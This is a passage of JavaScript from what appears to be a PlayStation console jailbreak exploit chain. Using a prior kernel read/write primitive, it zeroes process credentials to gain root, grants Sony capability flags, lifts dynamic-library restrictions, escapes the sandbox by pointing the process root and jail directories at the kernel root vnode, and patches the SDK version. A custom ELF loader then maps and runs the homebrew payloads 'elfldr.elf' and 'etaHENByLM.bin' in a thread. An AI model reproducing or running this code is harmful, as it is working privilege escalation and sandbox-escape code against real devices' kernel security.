        await krw.write4(krw.procUcredAddr.add32(0x14), 0); // cr_rgid

        // Escalate sony privs
        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);                              // cr_sceAttr[0]

        // Remove dynlib restriction
        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);

        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
        await krw.write4(restrict_flags_addr, 0);

        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
        await krw.write8(libkernel_ref_addr, new int64(1, 0));

        cur_uid = await chain.syscall(SYS_GETUID);
        debug_log("We root now? uid=0x" + cur_uid, LogLevel.INFO);

        // Escape sandbox
        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        debug_log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir

        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        debug_log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);

        // Patch PS4 SDK version
        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
            debug_log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
        }

        ///////////////////////////////////////////////////////////////////////
        // Stage 6: loader
        ///////////////////////////////////////////////////////////////////////

        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
        let jit_handle_store = p.malloc(0x4);
        // let test_store_buf   = p.malloc(0x4);

        // ELF sizes and offsets

        let OFFSET_ELF_HEADER_ENTRY = 0x18;
        let OFFSET_ELF_HEADER_PHOFF = 0x20;
        let OFFSET_ELF_HEADER_PHNUM = 0x38;

        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

        let OFFSET_RELA_OFFSET = 0x00;
        let OFFSET_RELA_INFO = 0x08;
        let OFFSET_RELA_ADDEND = 0x10;

        // ELF program header types
        let ELF_PT_LOAD = 0x01;
        let ELF_PT_DYNAMIC = 0x02;

        // ELF dynamic table types
        let ELF_DT_NULL = 0x00;
        let ELF_DT_RELA = 0x07;
        let ELF_DT_RELASZ = 0x08;
        let ELF_DT_RELAENT = 0x09;
        let ELF_R_AMD64_RELATIVE = 0x08;

        // ELF parsing
        var conn_ret_store = p.malloc(0x8);

        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
        let mapping_addr = new int64(0x26100000, 0x00000009);

        let elf_program_headers_offset = 0;
        let elf_program_headers_num = 0;
        let elf_entry_point = 0;

        var parse_elf_store = async function (total_sz = -1) {
            // Parse header
            // These are global variables
            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

            if (elf_program_headers_offset != 0x40) {
                debug_log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
                throw new Error("ELF header malformed, terminating connection.");
            }

            //debug_log("parsing ELF file (" + total_sz.toString(10) + " bytes)...");

            let text_segment_sz = 0;
            let data_segment_sz = 0;
            let rela_table_offset = 0;
            let rela_table_count = 0;
            let rela_table_size = 0;
            let rela_table_entsize = 0;
            /** @type {int64} */
            let shadow_write_mapping = 0;

            // Parse program headers and map segments
            for (let i = 0; i < elf_program_headers_num; i++) {
                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);

                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;

                if (program_type == ELF_PT_LOAD) {
                    // For executable segments, we need to take some care and do alias'd mappings.
                    // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
                    if ((program_flags & 1) == 1) {
                        // Executable segment
                        text_segment_sz = program_memsz;

                        // Get exec
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                        await chain.run();
                        let exec_handle = p.read4(jit_handle_store);

                        // Get write alias
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                        await chain.run();
                        let write_handle = p.read4(jit_handle_store);

                        // Map to shadow mapping
                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                        await chain.run();
                        shadow_write_mapping = p.read8(conn_ret_store);

                        // Copy in segment data
                        let dest = p.read8(conn_ret_store);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }

                        // Map executable segment
                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                        await chain.run();
                    } else {
                        // Regular data segment
                        // data_mapping_addr = mapping_addr.add32(program_vaddr);
                        data_segment_sz = aligned_memsz;

                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                        await chain.run();

                        // Copy in segment data
                        let dest = mapping_addr.add32(program_vaddr);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                    }
                }

                if (program_type == ELF_PT_DYNAMIC) {
                    // Parse dynamic tags, the ones we truly care about are rela-related.
                    for (let j = 0x00; ; j += 0x10) {
                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

                        // DT_NULL means we reached the end of the table
                        if (d_tag == ELF_DT_NULL || j > 0x100) {
                            break;
                        }

                        switch (d_tag) {
                            case ELF_DT_RELA:
                                rela_table_offset = d_val.low;
                                break;
                            case ELF_DT_RELASZ:
                                rela_table_size = d_val.low;
                                break;
                            case ELF_DT_RELAENT:
                                rela_table_entsize = d_val.low;
                                break;
                        }
                    }
                }
            }

            // Process relocations if they exist
            if (rela_table_offset != 0) {
                let base_address = 0x1000;

                // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
                // The linker script should guarantee it ends up in the first LOAD segment (code).
                rela_table_offset += base_address;

                // Rela count can be gotten from dividing the table size by entry size
                rela_table_count = rela_table_size / rela_table_entsize;

                // Parse relocs and apply them
                for (let i = 0; i < rela_table_count; i++) {
                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_OFFSET));
                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_INFO));
                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_ADDEND));

                    let reloc_addr = mapping_addr.add32(r_offset.low);

                    // If the relocation falls in the executable section, we need to redirect the write to the
                    // writable shadow mapping or we'll crash
                    if (r_offset.low <= text_segment_sz) {
                        reloc_addr = shadow_write_mapping.add32(r_offset.low);
                    }

                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
                        let reloc_value = mapping_addr.add32(r_addend.low); // B + A
                        p.write8(reloc_addr, reloc_value);
                    }
                }
            }
        }

        // reuse these plus we can more easily access them
        let rwpair_mem = p.malloc(0x8);
        let test_payload_store = p.malloc(0x8);
        let pthread_handle_store = p.malloc(0x8);
        let pthread_value_store = p.malloc(0x8);
        let args = p.malloc(0x8 * 6);

        var execute_elf_store = async function () {
            // zero out the buffers defined above
            p.write8(rwpair_mem, 0);
            p.write8(rwpair_mem.add32(0x4), 0);
            p.write8(test_payload_store, 0);
            p.write8(pthread_handle_store, 0);
            p.write8(pthread_value_store, 0);
            for (let i = 0; i < 0x8 * 6; i++) {
                p.write1(args.add32(i), 0);
            }

            // Pass master/victim pair to payload so it can do read/write
            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
            p.write4(rwpair_mem.add32(0x04), krw.victimSock);

            // Arguments to entrypoint
            p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
            p.write8(args.add32(0x08), krw.pipeMem);        // arg2 = int *rwpipe[2]
            p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
            p.write8(args.add32(0x18), krw.pipeAddr);       // arg4 = uint64_t kpipe_addr
            p.write8(args.add32(0x20), krw.kdataBase);      // arg5 = uint64_t kdata_base_addr
            p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout

            // Execute payload in pthread
            debug_log("    Executing...", LogLevel.INFO);
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));

        }

        /**
         * @returns Promise<number> - The return value of the payload
         */
        var wait_for_elf_to_exit = async function () {
            // Join pthread and wait until we're finished executing
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
            let res = p.read8(test_payload_store).low << 0;
            debug_log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);

            return res;
        }

        var load_local_elf = async function (filename) {
            try {
                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                await parse_elf_store(total_sz);
                await execute_elf_store();
                return await wait_for_elf_to_exit();
            } catch (error) {
                debug_log("Failed to load local elf: " + error, LogLevel.ERROR);
                return -1;
            }
        }
    
    async function load_etahen(){
      load_local_elf("elfldr.elf");
      await new Promise(resolve => setTimeout(resolve, 5000));
      load_local_elf("etaHENByLM.bin");
      await new Promise(resolve => setTimeout(resolve, 5000));
      showMessage("EtaHEN Successfully Loaded"),
      debug_log("EtaHEN Successfully Loaded");
      EndTimer();
    }
   
    showMessage("Loading EtaHEN..Please Wait"),
    debug_log("Loading EtaHEN..Please Wait");
    setTimeout(load_etahen, 1000);
}

function run_hax() {
    prepare();
}
